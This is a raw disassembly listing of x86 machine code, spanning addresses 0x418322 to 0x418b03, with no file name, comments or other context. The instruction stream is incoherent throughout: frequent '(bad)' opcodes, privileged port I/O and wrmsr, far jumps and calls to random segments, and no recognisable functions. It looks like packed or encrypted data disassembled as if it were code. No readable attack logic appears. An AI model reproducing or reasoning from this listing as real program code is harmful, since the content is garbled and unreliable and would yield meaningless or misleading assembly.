  418322:	jmp    0x34b5:0x60215fd2
  418329:	aad    0x91
  41832b:	fistp  DWORD PTR [ecx]
  41832d:	xchg   edi,eax
  41832e:	lods   eax,DWORD PTR ds:[esi]
  41832f:	push   cs
  418330:	ja     0x418390
  418332:	mov    cl,0x8b
  418334:	test   DWORD PTR [esi-0x5b],0x518b0f1d
  41833b:	and    eax,0x2ce17d1f
  418340:	sbb    ah,BYTE PTR [ecx+0x50b7e2c6]
  418346:	cmp    BYTE PTR [eax+ebx*1],al
  418349:	sub    al,0xb4
  41834b:	cld    
  41834c:	out    dx,eax
  41834d:	imul   DWORD PTR [ebp+0x12255733]
  418353:	arpl   WORD PTR [ebx],cx
  418355:	pop    ds
  418356:	or     edi,DWORD PTR [edi+0x21]
  418359:	sbb    ah,bl
  41835b:	inc    esi
  41835c:	push   ss
  41835d:	fcom   DWORD PTR gs:[ecx]
  418360:	cmp    BYTE PTR [edi],bl
  418362:	nop
  418363:	iret   
  418364:	int    0x3
  418366:	mov    bl,0xf6
  418368:	sbb    BYTE PTR [eax+0x12],dl
  41836b:	data16 fmul QWORD PTR [edx+eax*1]
  41836f:	loopne 0x4183d9
  418371:	repnz in eax,dx
  418373:	lods   al,BYTE PTR ds:[esi]
  418374:	into   
  418375:	mov    eax,ds:0x9f975e8d
  41837a:	and    eax,edx
  41837c:	fwait
  41837d:	in     al,dx
  41837e:	aaa    
  41837f:	push   eax
  418380:	sti    
  418381:	pop    ds
  418382:	scas   al,BYTE PTR es:[edi]
  418383:	(bad)  
  418384:	sub    eax,0x6993ff3
  418389:	push   0xb20ed22d
  41838e:	stos   DWORD PTR es:[edi],eax
  41838f:	cmc    
  418390:	setle  BYTE PTR [esi+0x3d]
  418394:	call   0xcd64:0xbb1989e5
  41839b:	sbb    eax,0x70a3ce52
  4183a0:	inc    esp
  4183a1:	jae    0x418379
  4183a3:	and    eax,0xcc939c22
  4183a8:	add    ebp,edi
  4183aa:	xor    al,0x0
  4183ac:	jl     0x418333
  4183ae:	push   ds
  4183af:	call   0x56bf7b04
  4183b4:	fist   WORD PTR [ebp*4-0x17a6b3c8]
  4183bb:	dec    ebp
  4183bc:	inc    eax
  4183bd:	sub    eax,0xef264ec0
  4183c2:	xor    eax,0x803203e0
  4183c7:	and    DWORD PTR [edi+0x22],edi
  4183ca:	jecxz  0x4183aa
  4183cc:	cdq    
  4183cd:	jo     0x418395
  4183cf:	inc    esi
  4183d0:	xor    al,0x41
  4183d2:	adc    eax,0xdc286bcb
  4183d7:	aaa    
  4183d8:	test   eax,0xa819c5c5
  4183dd:	shl    DWORD PTR [edx],cl
  4183df:	outs   dx,DWORD PTR ds:[esi]
  4183e0:	stos   DWORD PTR es:[edi],eax
  4183e1:	xor    BYTE PTR [esp+eax*2],al
  4183e4:	test   eax,0x26193ba7
  4183e9:	ret    0xc352
  4183ec:	mov    BYTE PTR [ebp+0x2d6855ec],cl
  4183f2:	pop    ebx
  4183f3:	shl    edx,cl
  4183f5:	fcom   QWORD PTR [esi+0xf]
  4183f8:	arpl   WORD PTR [edi],sp
  4183fa:	lds    edi,FWORD PTR [edi+0x3f]
  4183fd:	xchg   edx,eax
  4183fe:	add    BYTE PTR [eax+0x29b335c8],ch
  418404:	or     ebx,DWORD PTR [edx+0xf]
  418407:	mov    ds:0x4e10e771,al
  41840c:	sti    
  41840d:	int    0xd6
  41840f:	std    
  418410:	pop    ebp
  418411:	sub    ah,0xd7
  418414:	sbb    BYTE PTR [eax],al
  418416:	cld    
  418417:	cwde   
  418418:	(bad)  
  418419:	mov    cl,0xf6
  41841b:	xchg   esp,edx
  41841d:	pop    ebp
  41841e:	add    dl,BYTE PTR [esi+0x7c7e1155]
  418424:	mov    al,0xf7
  418426:	push   ds
  418427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418428:	pusha  
  418429:	out    dx,al
  41842a:	pusha  
  41842b:	adc    eax,0xaa40a894
  418430:	or     BYTE PTR [ebx+0x7e2c5023],bl
  418436:	push   edi
  418437:	push   cs
  418438:	pop    esp
  418439:	stos   BYTE PTR es:[edi],al
  41843a:	sahf   
  41843b:	pop    es
  41843c:	cmp    BYTE PTR [esi+0x4fa8d354],dh
  418442:	outs   dx,BYTE PTR ds:[esi]
  418443:	in     al,0x9e
  418445:	retf   
  418446:	fistp  WORD PTR [ebp-0x75]
  418449:	dec    edx
  41844a:	xor    eax,0x2706cef4
  41844f:	ds stc 
  418451:	retf   
  418452:	add    BYTE PTR [ebx+edx*8-0x65a77418],0xf9
  41845a:	mov    dh,0x1b
  41845c:	pop    ebx
  41845d:	mov    ebx,0x1bc4f9ab
  418462:	(bad)  
  418463:	ins    BYTE PTR es:[edi],dx
  418464:	inc    edi
  418465:	inc    ebx
  418466:	mov    ebx,0x9affc05f
  41846b:	and    bl,BYTE PTR [eax]
  41846d:	lahf   
  41846e:	pop    esp
  41846f:	daa    
  418470:	and    bh,BYTE PTR ds:0xd919cd8a
  418476:	or     DWORD PTR [ecx+0x49484797],esp
  41847c:	mov    esp,0x1b133382
  418481:	cld    
  418482:	jnp    0x4184ff
  418484:	in     al,dx
  418485:	in     eax,0xbd
  418487:	xor    eax,0x3e3f9880
  41848c:	(bad)
  41848f:	mov    ds:0xeb72415e,al
  418494:	fbld   TBYTE PTR [edi+esi*4-0x64ca3f7a]
  41849b:	cs cwde 
  41849d:	sbb    dx,WORD PTR fs:0xf6847a03
  4184a5:	fsubr  QWORD PTR [edi-0x6c]
  4184a8:	or     eax,0x488d2436
  4184ad:	out    0x4b,al
  4184af:	or     edx,DWORD PTR [ecx]
  4184b1:	cli    
  4184b2:	dec    ebx
  4184b3:	popa   
  4184b4:	nop
  4184b5:	dec    edx
  4184b6:	pop    ebp
  4184b7:	push   esp
  4184b8:	mov    BYTE PTR [eax-0x4daad3b1],dh
  4184be:	jnp    0x418442
  4184c0:	hlt    
  4184c1:	mov    eax,0xdfeda8e7
  4184c6:	fbstp  TBYTE PTR ds:0x24a896ce
  4184cc:	or     bh,BYTE PTR [edi]
  4184ce:	das    
  4184cf:	jno    0x418527
  4184d1:	adc    al,0xf4
  4184d3:	mov    edi,0xcb37d946
  4184d8:	imul   ebp,DWORD PTR [eax],0xfffffffd
  4184db:	stos   BYTE PTR es:[edi],al
  4184dc:	or     esp,DWORD PTR [edx+0x4]
  4184df:	xor    DWORD PTR [edi],edi
  4184e1:	mov    dh,0x6d
  4184e3:	data16 cmc 
  4184e5:	test   bh,0x97
  4184e8:	sub    dl,BYTE PTR [edi-0x52fe46cc]
  4184ee:	xor    BYTE PTR [eax+0x22],ch
  4184f1:	and    BYTE PTR [bx+si],cl
  4184f4:	aad    0xa2
  4184f6:	jmp    0x7320:0x604b8bbf
  4184fd:	cs mov edx,0xdb6dc181
  418503:	jb     0x418491
  418505:	scas   eax,DWORD PTR es:[edi]
  418506:	dec    ebp
  418507:	jl     0x4184ab
  418509:	pop    ebp
  41850a:	lods   eax,DWORD PTR ds:[esi]
  41850b:	ins    DWORD PTR es:[edi],dx
  41850c:	xchg   ecx,eax
  41850d:	push   es
  41850e:	js     0x418546
  418510:	mov    ds:0x2eb8ed67,al
  418515:	out    dx,al
  418516:	cmp    eax,0x4741e417
  41851b:	sbb    esi,DWORD PTR [edi]
  41851d:	push   ebx
  41851e:	iret   
  41851f:	fs jnp 0x41857c
  418522:	adc    DWORD PTR [ebx+eiz*4-0xe94e54],ecx
  418529:	add    ebx,ebx
  41852b:	sbb    esp,DWORD PTR [edi-0x1b]
  41852e:	sub    ch,BYTE PTR [esi]
  418530:	cmp    eax,0xa8ff6576
  418535:	in     al,0xc2
  418537:	jnp    0x41855d
  418539:	call   0xbc5e:0x744880d6
  418540:	xchg   BYTE PTR [ecx],ah
  418542:	dec    eax
  418543:	out    0x99,al
  418545:	jge    0x418578
  418547:	loop   0x4184ca
  418549:	mov    eax,ds:0x6bcc283e
  41854e:	xchg   edx,eax
  41854f:	and    cl,BYTE PTR [esi-0x37a036a5]
  418555:	push   ebx
  418556:	outs   dx,DWORD PTR ds:[esi]
  418557:	cwde   
  418558:	and    eax,ecx
  41855a:	outs   dx,BYTE PTR ds:[esi]
  41855b:	cli    
  41855c:	or     BYTE PTR [eax+eax*2],cl
  41855f:	in     al,0xba
  418561:	(bad)  
  418562:	push   esi
  418563:	dec    edi
  418564:	cli    
  418565:	sar    DWORD PTR [esi+0x43],1
  418568:	inc    ebx
  418569:	cli    
  41856a:	out    0x6b,eax
  41856c:	hlt    
  41856d:	mov    ah,0xcc
  41856f:	pop    ebx
  418570:	mov    dh,0x69
  418572:	scas   al,BYTE PTR es:[edi]
  418573:	fdiv   st(6),st
  418575:	lock call 0x20b8b71
  41857b:	jnp    0x4185b4
  41857d:	loope  0x4185ed
  41857f:	or     edi,edx
  418581:	xchg   ecx,eax
  418582:	ds hlt 
  418584:	jle    0x41851b
  418586:	pop    esi
  418587:	jge    0x41858b
  418589:	inc    edi
  41858a:	gs out dx,eax
  41858c:	xchg   ebx,eax
  41858d:	ja     0x41855e
  41858f:	jmp    0xf2ad:0x488502e5
  418596:	test   eax,0x24f40a54
  41859b:	nop
  41859c:	int3   
  41859d:	gs xchg edx,eax
  41859f:	das    
  4185a0:	icebp  
  4185a1:	jne    0x4185b3
  4185a3:	in     al,dx
  4185a4:	dec    ecx
  4185a5:	inc    eax
  4185a6:	fs xchg ebx,eax
  4185a8:	and    esi,DWORD PTR [edx+edx*1+0x65700d16]
  4185af:	pushf  
  4185b0:	dec    edx
  4185b1:	cld    
  4185b2:	push   0xfffffff1
  4185b4:	sbb    al,0x1e
  4185b6:	aaa    
  4185b7:	xor    eax,0x21c76966
  4185bc:	dec    eax
  4185bd:	mov    ebp,0x2f1fc151
  4185c2:	(bad)  
  4185c3:	enter  0x1410,0x46
  4185c7:	adc    eax,0x3cf566a3
  4185cc:	adc    eax,0xc7515734
  4185d1:	mov    cl,0xf7
  4185d3:	cwde   
  4185d4:	or     DWORD PTR [eax+eax*2+0x78],0x267e05e2
  4185dc:	dec    esi
  4185dd:	imul   edx,DWORD PTR [esi],0x3b
  4185e0:	jge    0x418613
  4185e2:	hlt    
  4185e3:	punpckhwd mm7,mm3
  4185e6:	pop    esp
  4185e7:	jp     0x418591
  4185e9:	fst    DWORD PTR [esi]
  4185eb:	test   DWORD PTR [ebx-0x5f0d8892],edi
  4185f1:	imul   eax,DWORD PTR [edx-0x512c02a3],0xffffff9a
  4185f8:	ja     0x418648
  4185fa:	mov    dl,0x3a
  4185fc:	lds    ecx,FWORD PTR [edi]
  4185fe:	fs dec edi
  418600:	fadd   QWORD PTR [edx+edx*2+0x1c9109a5]
  418607:	push   ebp
  418608:	mov    WORD PTR [ecx+0x13],gs
  41860b:	add    al,0xc8
  41860d:	mov    ds:0x3e912dec,eax
  418612:	dec    ecx
  418613:	jno    0x41868b
  418615:	clc    
  418616:	or     BYTE PTR [edx],bl
  418618:	mov    ch,0xab
  41861a:	xchg   ebx,eax
  41861b:	mov    ds:0x3c8de591,al
  418620:	sar    BYTE PTR [esi+0x66],cl
  418623:	mov    edi,DWORD PTR [ebx+eax*4+0x1e543f7d]
  41862a:	dec    edi
  41862b:	daa    
  41862c:	mov    esp,0xf43de37e
  418631:	das    
  418632:	mov    WORD PTR [edx],ss
  418634:	jp     0x418696
  418636:	mov    ebp,0xe5345aea
  41863b:	or     esi,ebp
  41863d:	sbb    al,0xc7
  41863f:	xchg   BYTE PTR [ebp+edx*2-0x6a],cl
  418643:	in     al,dx
  418644:	daa    
  418645:	fwait
  418646:	adc    edi,DWORD PTR [esi]
  418648:	dec    ebx
  418649:	jl     0x4185e2
  41864b:	mov    esp,0xc4e46705
  418650:	pop    edi
  418651:	mul    edi
  418653:	fstp   DWORD PTR [ebx+edi*2-0x61]
  418657:	pop    ebx
  418658:	jnp    0x41868a
  41865a:	sub    BYTE PTR [ebx+0x7a],al
  41865d:	out    dx,eax
  41865e:	rcr    BYTE PTR [eax-0x69c2bef0],cl
  418664:	xor    al,0xcf
  418666:	pop    ss
  418667:	js     0x418684
  418669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41866a:	fsub   DWORD PTR [eax+esi*1]
  41866d:	lods   al,BYTE PTR ds:[esi]
  41866e:	mov    bh,0xe8
  418670:	adc    BYTE PTR [ebx],0x8a
  418673:	and    ah,BYTE PTR [ebp-0x35936f9c]
  418679:	inc    esp
  41867a:	jmp    0x418627
  41867c:	xor    al,0x32
  41867e:	imul   esi,DWORD PTR [edx],0xffffffd8
  418681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418682:	mov    WORD PTR [edx+0x6b],ds
  418685:	hlt    
  418686:	data16 int 0x8d
  418689:	into   
  41868a:	in     al,0xcd
  41868c:	cs test al,0xae
  41868f:	test   DWORD PTR ds:0x78455bbb,0x2c3f1a78
  418699:	jne    0x41867b
  41869b:	xchg   DWORD PTR [edi+0x5b116552],esp
  4186a1:	sbb    al,0x5
  4186a3:	inc    edx
  4186a4:	mov    dh,0x78
  4186a6:	in     eax,0x79
  4186a8:	xchg   esp,eax
  4186a9:	shl    DWORD PTR [eax-0xc7f8e87],cl
  4186af:	inc    ecx
  4186b0:	mov    ds:0xf2e6041c,al
  4186b5:	repz sub DWORD PTR [edi+edx*1-0x2a],ecx
  4186ba:	and    ecx,eax
  4186bc:	cli    
  4186bd:	jo     0x41864e
  4186bf:	adc    DWORD PTR [ecx],0x3b0d7c41
  4186c5:	mov    dh,0x2b
  4186c7:	xchg   DWORD PTR [eax+0x18b3b17b],edx
  4186cd:	sub    eax,0x37afb3ce
  4186d2:	jo     0x4186f2
  4186d4:	mov    ds:0xe748ce14,al
  4186d9:	leave  
  4186da:	pop    edx
  4186db:	add    DWORD PTR [edi],0xffffffa8
  4186de:	mov    ch,0xc3
  4186e0:	lock cld 
  4186e2:	jmp    0x4186bc
  4186e4:	rep lods al,BYTE PTR ds:[esi]
  4186e6:	sub    ecx,DWORD PTR [esi-0x12ad4e2f]
  4186ec:	jecxz  0x418743
  4186ee:	retf   
  4186ef:	pop    ecx
  4186f0:	(bad)  
  4186f2:	sub    ebp,ebp
  4186f4:	jg     0x418711
  4186f6:	cmp    al,0xa2
  4186f8:	sbb    eax,DWORD PTR [esi]
  4186fa:	adc    dl,ch
  4186fc:	fnstcw WORD PTR [ebp+0x90351eb]
  418702:	sbb    bl,ch
  418704:	lds    ebx,FWORD PTR [edi+ebp*1+0x38ad58ae]
  41870b:	lods   eax,DWORD PTR ds:[esi]
  41870c:	aam    0x71
  41870e:	sub    esp,edi
  418710:	loopne 0x4186a8
  418712:	test   DWORD PTR [eax-0x2feb3379],ecx
  418718:	inc    esi
  418719:	out    dx,eax
  41871a:	aad    0xd0
  41871c:	sub    BYTE PTR [edx],bl
  41871e:	les    ecx,FWORD PTR [eax]
  418720:	push   ss
  418721:	dec    eax
  418722:	jns    0x41878f
  418724:	jmp    0x5ccd:0x2101bd4e
  41872b:	sbb    DWORD PTR [ebx-0x3],ebp
  41872e:	adc    eax,0x3b352e09
  418733:	retf   
  418734:	into   
  418735:	dec    ecx
  418736:	mov    edx,0xba8aaa3f
  41873b:	(bad)  [esp+ebx*1-0x5a]
  41873f:	dec    edi
  418740:	cmp    al,0x37
  418742:	mov    DWORD PTR [ebx-0x503fac60],ebp
  418748:	pop    ebx
  418749:	xchg   edx,eax
  41874a:	stc    
  41874b:	dec    ebp
  41874c:	cmp    BYTE PTR [esi+0x4b],ch
  41874f:	pop    ebp
  418750:	cmp    al,0xdb
  418752:	add    cl,BYTE PTR [edi+0x1293405b]
  418758:	fiadd  WORD PTR [edx-0x2724d784]
  41875e:	test   eax,0xa2da070e
  418763:	fadd   DWORD PTR [eax+0x75]
  418766:	sub    al,0xe5
  418768:	xchg   ebp,eax
  418769:	dec    ebx
  41876a:	mov    bl,0x8b
  41876c:	fst    QWORD PTR [eax]
  41876e:	addr16 push esi
  418770:	cmc    
  418771:	push   ds
  418772:	fsubr  DWORD PTR [eax]
  418774:	hlt    
  418775:	aam    0x7d
  418777:	ja     0x4187a0
  418779:	loop   0x4187ef
  41877b:	out    0xf5,al
  41877d:	ffreep st(3)
  41877f:	inc    eax
  418780:	das    
  418781:	xor    al,0x2d
  418783:	sar    ebx,1
  418785:	mov    bl,BYTE PTR [ecx-0x7]
  418788:	mov    edx,0xd8b43495
  41878d:	adc    eax,0x676b04c1
  418792:	imul   ebp,DWORD PTR [edx-0x66524243],0x15
  418799:	stos   DWORD PTR es:[edi],eax
  41879a:	ins    DWORD PTR es:[edi],dx
  41879b:	jmp    0x418803
  41879d:	adc    dh,BYTE PTR [edi-0x58]
  4187a0:	fs pop ss
  4187a2:	int3   
  4187a3:	and    DWORD PTR [esi-0x2b63a3ad],eax
  4187a9:	mov    al,ds:0xb5cdc43d
  4187ae:	xchg   BYTE PTR [ebx+edx*8-0x120375a7],bh
  4187b5:	shr    DWORD PTR [edx+edx*1+0x74],0xdc
  4187ba:	(bad)  
  4187bb:	lods   eax,DWORD PTR ds:[esi]
  4187bc:	mov    BYTE PTR [eax+0xc],ah
  4187bf:	inc    ebp
  4187c0:	stos   DWORD PTR es:[edi],eax
  4187c1:	xchg   esi,eax
  4187c2:	or     eax,0x6f2434fb
  4187c7:	(bad)  
  4187c8:	push   edi
  4187c9:	popa   
  4187ca:	inc    eax
  4187cb:	outs   dx,DWORD PTR ds:[esi]
  4187cc:	push   ecx
  4187cd:	sbb    DWORD PTR [ecx],ebp
  4187cf:	mov    bl,0x41
  4187d1:	push   ebx
  4187d2:	test   DWORD PTR [edx],0xf3baed40
  4187d8:	jge    0x418835
  4187da:	mov    BYTE PTR [esp+esi*1-0x35],cl
  4187de:	clc    
  4187df:	fucomi st,st(6)
  4187e1:	mov    DWORD PTR [eax],ebx
  4187e3:	call   0x5da6:0x66a52ed3
  4187ea:	add    DWORD PTR [esi],ebx
  4187ec:	aam    0x9a
  4187ee:	mov    fs,WORD PTR [ecx+edx*4]
  4187f1:	pop    edx
  4187f2:	popf   
  4187f3:	jecxz  0x41884c
  4187f5:	out    0xf8,al
  4187f7:	mov    ah,0xfa
  4187f9:	xchg   DWORD PTR [edx],edi
  4187fb:	cmc    
  4187fc:	in     al,dx
  4187fd:	sub    DWORD PTR [edi+0x456b820],edi
  418803:	jmp    0xb8aa:0xd1039aec
  41880a:	push   esi
  41880b:	sub    edi,esi
  41880d:	xlat   BYTE PTR ds:[ebx]
  41880e:	mov    bl,0xe3
  418810:	sub    dh,bh
  418812:	xchg   ebx,eax
  418813:	jnp    0x4187dc
  418815:	or     DWORD PTR [ebp-0x601da5a8],ebp
  41881b:	sbb    BYTE PTR [eax+ebp*2-0x214f8282],ah
  418822:	pop    esp
  418823:	sbb    bh,BYTE PTR [edi]
  418825:	push   esp
  418826:	(bad)  
  418827:	or     DWORD PTR [ebp+edx*1+0x6b],edx
  41882b:	sahf   
  41882c:	loopne 0x418880
  41882e:	(bad)  
  41882f:	iret   
  418830:	xchg   ebx,eax
  418831:	xchg   edi,eax
  418832:	xchg   BYTE PTR [edx],dl
  418834:	sbb    eax,0x8ca23b3f
  418839:	jmp    0x418888
  41883b:	xlat   BYTE PTR ds:[ebx]
  41883c:	adc    ecx,DWORD PTR [eax+0x74]
  41883f:	popf   
  418840:	pop    ecx
  418841:	psrlw  mm6,QWORD PTR [esi]
  418844:	or     esp,DWORD PTR [esi+0x1f9629a2]
  41884a:	jecxz  0x41888a
  41884c:	enter  0x3de8,0x81
  418850:	xchg   edi,eax
  418851:	or     al,0x5
  418853:	xchg   ebx,eax
  418854:	test   eax,0x9ba897d2
  418859:	add    BYTE PTR [edx-0x29],0x1a
  41885d:	add    al,0x79
  41885f:	or     BYTE PTR [ebx+0xb688b22],ah
  418865:	pop    edi
  418866:	ret    0x8e19
  418869:	dec    edi
  41886a:	mov    edi,0xec75f679
  41886f:	int    0x8b
  418871:	(bad)  
  418872:	enter  0x9bf0,0x0
  418876:	dec    edi
  418877:	xor    ah,dl
  418879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41887a:	sti    
  41887b:	retf   
  41887c:	mov    gs,esp
  41887e:	cmp    BYTE PTR [eax+0x68c32c35],cl
  418884:	cwde   
  418885:	jl     0x41887b
  418887:	inc    ebp
  418888:	ror    dl,1
  41888a:	mov    edi,0xbc341297
  41888f:	ins    DWORD PTR es:[edi],dx
  418890:	es xor al,0x3e
  418893:	and    al,0x32
  418895:	outs   dx,DWORD PTR ds:[esi]
  418896:	push   ecx
  418897:	in     eax,dx
  418898:	sti    
  418899:	(bad)
  41889c:	dec    ebx
  41889d:	test   BYTE PTR [edi+edi*2-0x6c8e47d3],bh
  4188a4:	fld    QWORD PTR [edi]
  4188a6:	jl     0x4188e3
  4188a8:	sbb    BYTE PTR [esi+0x60],ch
  4188ab:	outs   dx,BYTE PTR ds:[esi]
  4188ac:	imul   esi,DWORD PTR [ebx],0x2e
  4188af:	mov    eax,0xcf64342a
  4188b4:	xchg   dl,bh
  4188b6:	sub    al,0x32
  4188b8:	popf   
  4188b9:	cli    
  4188ba:	mov    dl,cl
  4188bc:	stos   DWORD PTR es:[edi],eax
  4188bd:	inc    eax
  4188be:	mov    esi,0x8e9a6d
  4188c3:	pop    ecx
  4188c4:	mov    eax,0xdb03e76a
  4188c9:	loop   0x4188ec
  4188cb:	fs loop 0x418929
  4188ce:	inc    esp
  4188cf:	retf   0xa835
  4188d2:	pop    ecx
  4188d3:	pop    ebx
  4188d4:	pusha  
  4188d5:	retf   
  4188d6:	sbb    DWORD PTR [ebx-0x4ddaec45],0xadbc490a
  4188e0:	jnp    0x4188a3
  4188e2:	jle    0x41892e
  4188e4:	mov    ah,0x27
  4188e6:	adc    al,0x6f
  4188e8:	xchg   ebx,eax
  4188e9:	std    
  4188ea:	rcr    BYTE PTR [esi-0x6d],0x72
  4188ee:	pop    edx
  4188ef:	mov    bh,0x45
  4188f1:	je     0x418961
  4188f3:	into   
  4188f4:	jmp    0xd767b83c
  4188f9:	mov    WORD PTR [edx],cs
  4188fb:	in     eax,dx
  4188fc:	add    dl,BYTE PTR [edi]
  4188fe:	mov    ds:0x89e2452c,al
  418903:	loopne 0x41893c
  418905:	dec    esi
  418906:	add    ch,BYTE PTR [esp+edi*1+0x2d]
  41890a:	mov    eax,ds:0xc32d18eb
  41890f:	dec    eax
  418910:	add    eax,0x2f683d5e
  418915:	call   0x264778a3
  41891a:	push   esp
  41891b:	mov    edi,edi
  41891d:	and    DWORD PTR [ebx+ebx*8+0x64],esp
  418921:	sti    
  418922:	out    0x15,eax
  418924:	dec    ebp
  418925:	outs   dx,DWORD PTR ds:[esi]
  418926:	sub    BYTE PTR [edx+0x33823161],0x50
  41892d:	and    dh,dh
  41892f:	ja     0x4188c3
  418931:	in     eax,dx
  418932:	repz jl 0x4188da
  418935:	inc    edi
  418936:	fisttp QWORD PTR [esi-0x46]
  418939:	dec    esp
  41893a:	dec    ecx
  41893b:	sbb    al,0x2f
  41893d:	dec    edx
  41893e:	lods   al,BYTE PTR ds:[esi]
  41893f:	pop    edi
  418940:	or     ebx,ecx
  418942:	and    eax,DWORD PTR [edi+edx*1]
  418945:	lea    ecx,[ecx-0x40]
  418948:	jne    0x4188d9
  41894a:	sub    BYTE PTR [edi-0x48],cl
  41894d:	leave  
  41894e:	test   esi,0x92c49a5e
  418954:	sbb    DWORD PTR [esi-0x31d01679],edx
  41895a:	out    0x79,eax
  41895c:	repnz or eax,0x598a4679
  418962:	ins    DWORD PTR es:[edi],dx
  418963:	in     al,0x1c
  418965:	inc    ebx
  418966:	mov    ch,0xb
  418968:	daa    
  418969:	cmp    eax,0xf90293c9
  41896e:	test   DWORD PTR [esp+edi*1+0x46],ebx
  418972:	scas   eax,DWORD PTR es:[edi]
  418973:	ret    0xb928
  418976:	jg     0x4189f4
  418978:	jge    0x418996
  41897a:	push   eax
  41897b:	imul   esp,DWORD PTR [esi],0x24870440
  418981:	inc    esp
  418982:	imul   edi,DWORD PTR [edx+0x2d],0xb0d9245d
  418989:	push   edx
  41898a:	jns    0x41897b
  41898c:	jmp    0x61514724
  418991:	(bad)  
  418992:	mov    ebp,0xc68e02d9
  418997:	into   
  418998:	mov    esi,0x68f7cd1a
  41899d:	jmp    0x418a1b
  41899f:	fnstenv [ebp-0x9]
  4189a2:	jecxz  0x418a14
  4189a4:	ds pop edi
  4189a6:	clc    
  4189a7:	add    al,0x88
  4189a9:	sbb    eax,0xef1a0f40
  4189ae:	shl    DWORD PTR [ebp-0x4da286e7],0x97
  4189b5:	shl    BYTE PTR [esi-0xc2c64e3],cl
  4189bb:	jge    0x4189ae
  4189bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189be:	fiadd  WORD PTR ds:0xd8919aaf
  4189c4:	dec    eax
  4189c5:	shl    ebp,0xd0
  4189c8:	fs pop edi
  4189ca:	icebp  
  4189cb:	adc    dl,cl
  4189cd:	fwait
  4189ce:	push   ebp
  4189cf:	mov    ah,0x3c
  4189d1:	push   esp
  4189d2:	xor    esi,DWORD PTR [ecx+0x2a]
  4189d5:	add    DWORD PTR [eax+0xf],ebx
  4189d8:	iret   
  4189d9:	mov    al,0x73
  4189db:	push   ss
  4189dc:	rcl    BYTE PTR [ecx-0x19],0xb9
  4189e0:	cwde   
  4189e1:	sub    al,0xa3
  4189e3:	sahf   
  4189e4:	data16 mov bh,0x4
  4189e7:	js     0x4189c7
  4189e9:	mov    eax,edi
  4189eb:	popf   
  4189ec:	adc    DWORD PTR [edx],0x29
  4189ef:	xchg   DWORD PTR [eax],esi
  4189f1:	into   
  4189f2:	enter  0x3476,0xed
  4189f6:	jno    0x4189fb
  4189f8:	mov    BYTE PTR [edx-0x3202053c],bh
  4189fe:	mov    edx,0x9af8623c
  418a03:	push   ds
  418a04:	push   es
  418a05:	jp     0x4189d8
  418a07:	push   eax
  418a08:	mov    bl,ch
  418a0a:	inc    ebx
  418a0b:	loop   0x4189dd
  418a0d:	xchg   ebp,eax
  418a0e:	loope  0x418a23
  418a10:	retf   0x3d43
  418a13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a15:	aas    
  418a16:	neg    esi
  418a18:	ror    DWORD PTR [ebp-0x206c7dfc],1
  418a1e:	sbb    eax,0x10265d39
  418a23:	inc    ebp
  418a24:	imul   ebx,DWORD PTR [edi],0x106200b7
  418a2a:	or     bl,BYTE PTR [edi+ebp*8]
  418a2d:	add    al,ch
  418a2f:	sub    cl,al
  418a31:	dec    esi
  418a32:	out    0xd,al
  418a34:	js     0x418a41
  418a36:	ds out 0x8e,al
  418a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a3a:	xor    ah,0x70
  418a3d:	ror    DWORD PTR [edi-0x6b],1
  418a40:	or     bl,ch
  418a42:	in     eax,0x2
  418a44:	xchg   BYTE PTR [eax+ebp*4+0x7490bd35],bl
  418a4b:	std    
  418a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a4d:	out    0x9c,al
  418a4f:	sbb    BYTE PTR [ebp+0x1c],dh
  418a52:	test   DWORD PTR [edx+eax*1-0x3fc68b74],edx
  418a59:	add    al,0x9f
  418a5b:	adc    ebx,DWORD PTR [edx+ecx*4-0x5cb5def2]
  418a62:	icebp  
  418a63:	sub    esi,ecx
  418a65:	inc    edx
  418a66:	push   ecx
  418a67:	push   ecx
  418a68:	mov    BYTE PTR [eax],bl
  418a6a:	xchg   esp,eax
  418a6b:	push   ebx
  418a6c:	out    dx,al
  418a6d:	sub    esi,DWORD PTR ds:0xe1096d31
  418a73:	int3   
  418a74:	mov    esp,0x746c80aa
  418a79:	cld    
  418a7a:	lods   al,BYTE PTR ds:[esi]
  418a7b:	cld    
  418a7c:	pop    ecx
  418a7d:	wrmsr  
  418a7f:	and    DWORD PTR [ecx+0xc],0xcc18d2e
  418a86:	sbb    eax,0xe8e0637c
  418a8b:	dec    ebx
  418a8c:	jecxz  0x418b0d
  418a8e:	xor    ecx,DWORD PTR ds:0x71e0606a
  418a94:	clc    
  418a95:	push   0xb746e01f
  418a9a:	xchg   edx,eax
  418a9b:	or     eax,DWORD PTR [ebx]
  418a9d:	adc    DWORD PTR [ecx+0x19],ecx
  418aa0:	scas   al,BYTE PTR es:[edi]
  418aa1:	jg     0x418af5
  418aa3:	sub    edx,DWORD PTR [esi-0x3a5a7973]
  418aa9:	arpl   WORD PTR [ecx+0x3a],dx
  418aac:	(bad)  
  418aad:	cmp    ebp,eax
  418aaf:	xchg   esp,eax
  418ab0:	inc    esp
  418ab1:	ja     0x418a42
  418ab3:	add    DWORD PTR [esi],edx
  418ab5:	mov    bh,0x63
  418ab7:	adc    BYTE PTR [ebp-0x64aab5b3],al
  418abd:	mov    edi,0xaf424d66
  418ac2:	mov    esp,0xd8ba4697
  418ac7:	shr    BYTE PTR [edi+0x49],1
  418aca:	gs in  al,dx
  418acc:	jnp    0x418ae6
  418ace:	xor    edx,DWORD PTR [eax+0x7489b136]
  418ad4:	add    eax,ecx
  418ad6:	pusha  
  418ad7:	(bad)  
  418ad8:	in     eax,dx
  418ad9:	and    edx,DWORD PTR [esi+0x91ea5e]
  418adf:	std    
  418ae0:	adc    edi,ebx
  418ae2:	aas    
  418ae3:	inc    ebx
  418ae4:	js     0x418aa9
  418ae6:	mov    al,ds:0x26c4a64e
  418aeb:	mov    edi,0x75443d3d
  418af0:	jns    0x418ad6
  418af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418af3:	mov    al,ds:0xc85b5908
  418af8:	push   eax
  418af9:	lea    esi,[edi+0x7a]
  418afc:	enter  0xd981,0xdf
  418b00:	sbb    ah,al
  418b02:	inc    esi
  418b03:	sub    bl,BYTE PTR [ecx]
